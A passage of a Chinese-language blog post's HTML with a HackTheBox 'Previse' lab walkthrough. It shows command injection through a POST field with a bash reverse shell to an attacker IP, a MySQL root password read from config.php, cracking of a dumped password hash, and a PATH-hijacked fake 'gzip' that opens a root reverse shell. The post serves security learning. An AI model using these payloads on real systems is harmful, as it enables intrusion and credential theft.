invoke__">header</span>(<span class="hljs-string">&#x27;Content-Length: &#x27;</span> . <span class="hljs-title function_ invoke__">filesize</span>(<span class="hljs-variable">$filepath</span>));<br>    <span class="hljs-title function_ invoke__">ob_clean</span>(); <span class="hljs-comment">// Discard data in the output buffer</span><br>    <span class="hljs-title function_ invoke__">flush</span>(); <span class="hljs-comment">// Flush system headers</span><br>    <span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-variable">$filepath</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">http_response_code</span>(<span class="hljs-number">404</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125; <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>它在调用python执行/log_process.py对用户提交的post参数进行处理，而且没有任何过滤，这里或许会存在RCE，脚本对应的地址：</p>
+<img src="https://www.worldisend.com/img/image-20220517155729507.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220517155729507" style="zoom:200%;" />
+
+<img src="https://www.worldisend.com/img/image-20220517155748185.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220517155748185" style="zoom:200%;" />
+
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/logs.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>previse.htb<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>62<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://previse.htb<br><span class="hljs-attribute">DNT</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://previse.htb/file_logs.php<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=8j4orelok55b33gs1djn3105m3<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><br><span class="language-apache"><span class="hljs-attribute">delim</span>=comma;bash -c &#x27;bash -i &gt;%<span class="hljs-number">26</span> /dev/tcp/<span class="hljs-number">10.10.16.7</span>/<span class="hljs-number">9001</span> <span class="hljs-number">0</span>&gt;%<span class="hljs-number">261</span>&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; nc -lvnp 9001<br>listening on [any] 9001 ...<br>connect to [10.10.16.7] from (UNKNOWN) [10.10.11.104] 53904<br>bash: cannot <span class="hljs-built_in">set</span> terminal process group (1413): Inappropriate ioctl <span class="hljs-keyword">for</span> device<br>bash: no job control <span class="hljs-keyword">in</span> this shell<br>www-data@previse:/var/www/html$ <br></code></pre></td></tr></table></figure>
+
+<h4 id="Elevated-privileges-number-one："><a href="#Elevated-privileges-number-one：" class="headerlink" title="Elevated privileges number one："></a>Elevated privileges number one：</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@previse:/var/www/html$ wget http://10.10.16.7/CVE-2021-2043.py<br>--2022-05-17 08:03:43--  http://10.10.16.7/CVE-2021-2043.py<br>Connecting to 10.10.16.7:80... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 3448 (3.4K) [text/x-python]<br>Saving to: <span class="hljs-string">&#x27;CVE-2021-2043.py&#x27;</span><br><br>CVE-2021-2043.py    100%[===================&gt;]   3.37K  16.0KB/s    <span class="hljs-keyword">in</span> 0.2s    <br><br>2022-05-17 08:03:44 (16.0 KB/s) - <span class="hljs-string">&#x27;CVE-2021-2043.py&#x27;</span> saved [3448/3448]<br><br>www-data@previse:/var/www/html$ <span class="hljs-built_in">ls</span><br>CVE-2021-2043.py	    css		       files.php   logout.php<br>accounts.php		    download.php       footer.php  logs.php<br>android-chrome-192x192.png  favicon-16x16.png  header.php  nav.php<br>android-chrome-512x512.png  favicon-32x32.png  index.php   site.webmanifest<br>apple-touch-icon.png	    favicon.ico        js	   status.php<br>config.php		    file_logs.php      login.php<br>www-data@previse:/var/www/html$ python ./CVE-2021-2043.py <br><span class="hljs-comment"># id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root),33(www-data)<br></code></pre></td></tr></table></figure>
+
+<h4 id="Elevated-privileges-number-two："><a href="#Elevated-privileges-number-two：" class="headerlink" title="Elevated privileges number two："></a>Elevated privileges number two：</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@previse:/var/www/html$ <span class="hljs-built_in">cat</span> config.php <br>&lt;?php<br><br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">connectDB</span></span>()&#123;<br>    <span class="hljs-variable">$host</span> = <span class="hljs-string">&#x27;localhost&#x27;</span>;<br>    <span class="hljs-variable">$user</span> = <span class="hljs-string">&#x27;root&#x27;</span>;<br>    <span class="hljs-variable">$passwd</span> = <span class="hljs-string">&#x27;mySQL_p@ssw0rd!:)&#x27;</span>;<br>    <span class="hljs-variable">$db</span> = <span class="hljs-string">&#x27;previse&#x27;</span>;<br>    <span class="hljs-variable">$mycon</span> = new mysqli(<span class="hljs-variable">$host</span>, <span class="hljs-variable">$user</span>, <span class="hljs-variable">$passwd</span>, <span class="hljs-variable">$db</span>);<br>    <span class="hljs-built_in">return</span> <span class="hljs-variable">$mycon</span>;<br>&#125;<br><br>?&gt;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@previse:/var/www/html$ mysql -h localhost -u root -p<span class="hljs-string">&#x27;mySQL_p@ssw0rd!:)&#x27;</span><br>mysql&gt; show databases;<br>+--------------------+<br>| Database           |<br>+--------------------+<br>| information_schema |<br>| mysql              |<br>| performance_schema |<br>| previse            |<br>| sys                |<br>+--------------------+<br>5 rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br>mysql&gt; use previse<br>Reading table information <span class="hljs-keyword">for</span> completion of table and column names<br>You can turn off this feature to get a quicker startup with -A<br><br>Database changed<br>mysql&gt; use previse;<br>Database changed<br>mysql&gt; show tables;<br>+-------------------+<br>| Tables_in_previse |<br>+-------------------+<br>| accounts          |<br>| files             |<br>+-------------------+<br>2 rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br><br>mysql&gt; select * from accounts;<br>+----+----------+------------------------------------+---------------------+<br>| <span class="hljs-built_in">id</span> | username | password                           | created_at          |<br>+----+----------+------------------------------------+---------------------+<br>|  1 | m4lwhere | $1$🧂llol<span class="hljs-variable">$DQpmdvnb7EeuO6UaqRItf</span>. | 2021-05-27 18:18:36 |<br>|  2 | hacker   | $1$🧂llol<span class="hljs-variable">$bwwe9x8dIfOj05MYTXy3V1</span> | 2022-05-17 07:15:43 |<br>+----+----------+------------------------------------+---------------------+<br>2 rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br></code></pre></td></tr></table></figure>
+
+<p>可以到hash示例页面看一眼是什么哈希，应该是md5crypt：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">https://hashcat.net/wiki/doku.php?id=example_hashes<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; hashcat -m 500 <span class="hljs-built_in">hash</span> /usr/share/wordlists/rockyou.txt        <br>hashcat (v6.2.5) starting<br><br>OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 11.1.0, SLEEF, DISTRO, POCL_DEBUG) - Platform <span class="hljs-comment">#1 [The pocl project]</span><br>=====================================================================================================================================<br>* Device <span class="hljs-comment">#1: pthread-Intel(R) Core(TM) i5-10210U CPU @ 1.60GHz, 1428/2920 MB (512 MB allocatable), 4MCU</span><br><br>Minimum password length supported by kernel: 0<br>Maximum password length supported by kernel: 256<br><br>Hashes: 1 digests; 1 unique digests, 1 unique salts<br>Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates<br>Rules: 1<br><br>Optimizers applied:<br>* Zero-Byte<br>* Single-Hash<br>* Single-Salt<br><br>$1$🧂llol<span class="hljs-variable">$DQpmdvnb7EeuO6UaqRItf</span>.:ilovecody112235!<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@previse:/var/www/html$ su m4lwhere<br>Password: <br>m4lwhere@previse:/var/www/html$ sudo -l<br>[sudo] password <span class="hljs-keyword">for</span> m4lwhere: <br>User m4lwhere may run the following commands on previse:<br>    (root) /opt/scripts/access_backup.sh<br>m4lwhere@previse:/var/www/html$ <span class="hljs-built_in">cat</span> /opt/scripts/access_backup.sh <br><span class="hljs-comment">#!/bin/bash</span><br><br><span class="hljs-comment"># We always make sure to store logs, we take security SERIOUSLY here</span><br><br><span class="hljs-comment"># I know I shouldnt run this as root but I cant figure it out programmatically on my account</span><br><span class="hljs-comment"># This is configured to run with cron, added to sudo so I can run as needed - we&#x27;ll fix it later when there&#x27;s time</span><br><br>gzip -c /var/log/apache2/access.log &gt; /var/backups/$(<span class="hljs-built_in">date</span> --<span class="hljs-built_in">date</span>=<span class="hljs-string">&quot;yesterday&quot;</span> +%Y%b%d)_access.gz<br>gzip -c /var/www/file_access.log &gt; /var/backups/$(<span class="hljs-built_in">date</span> --<span class="hljs-built_in">date</span>=<span class="hljs-string">&quot;yesterday&quot;</span> +%Y%b%d)_file_access.gz<br>m4lwhere@previse:/var/www/html$     <br></code></pre></td></tr></table></figure>
+
+<p>gzip没有使用绝对路径，可以更改环境变量被利用：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">m4lwhere@previse:/dev/shm$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;#!/bin/bash&#x27;</span> &gt; gzip                 <br>m4lwhere@previse:/dev/shm$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;bash -i &gt;&amp; /dev/tcp/10.10.16.7/9002 0&gt;&amp;1&quot;</span> &gt;&gt; gzip<br>m4lwhere@previse:/dev/shm$ <span class="hljs-built_in">cat</span> gzip <br><span class="hljs-comment">#!/bin/bash</span><br>bash -i &gt;&amp; /dev/tcp/10.10.16.7/9002 0&gt;&amp;1<br>m4lwhere@previse:/dev/shm$ <span class="hljs-built_in">export</span> PATH=/dev/shm:<span class="hljs-variable">$PATH</span><br>m4lwhere@previse:/dev/shm$ <span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span><br>/dev/shm:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin<br>m4lwhere@previse:/dev/shm$ <span class="hljs-built_in">chmod</span> +x ./gzip <br>m4lwhere@previse:/dev/shm$ sudo /opt/scripts/access_backup.sh<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; nc -lvnp 9002<br>listening on [any] 9002 ...<br>connect to [10.10.16.7] from (UNKNOWN) [10.10.11.104] 51578<br>root@previse:/dev/shm<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/HackTheBox/" class="category-chain-item">HackTheBox</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Linux/">#Linux</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>HackTheBox-Previse</div>
+      <div>http://example.com/2022/10/06/HackTheBox-Previse/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>Mosaic Theory</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>October 6, 2022</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/10/06/HackTheBox-Optimum/" title="HackTheBox-Optimum">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">HackTheBox-Optimum</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/10/06/HackTheBox-RedCross/" title="HackTheBox-RedCross">
+                        <span class="hidden-mobile">HackTheBox-RedCross</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;Table of Contents</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
